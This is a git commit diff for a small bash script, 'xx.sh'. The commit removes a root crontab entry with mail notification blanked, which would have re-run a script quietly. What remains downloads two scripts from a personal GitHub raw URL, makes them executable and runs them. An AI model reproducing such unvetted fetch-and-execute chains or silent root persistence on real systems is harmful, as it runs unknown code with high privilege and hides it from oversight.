6af0cf18ed885b5573360a06976e43c614a19369
krakh75 <161823687+krakh75@users.noreply.github.com>
2024-04-09 19:13:17 +1000

    Update xx.sh

--- xx.sh
+++ xx.sh
@@ -1,10 +1,4 @@
 #!/bin/bash
-sudo -i
-crontab<<EOF
-MAILTO=""
-HOME=/root/
-*/720 * * * * re-run.sh
-EOF
 curl -L https://raw.githubusercontent.com/krakh75/io/main/re-run.sh -o re-run.sh && chmod +x ./re-run.sh && \
 curl -L https://raw.githubusercontent.com/krakh75/io/main/edit.sh -o edit.sh && chmod +x ./edit.sh && \
 ./edit.sh re-run.sh
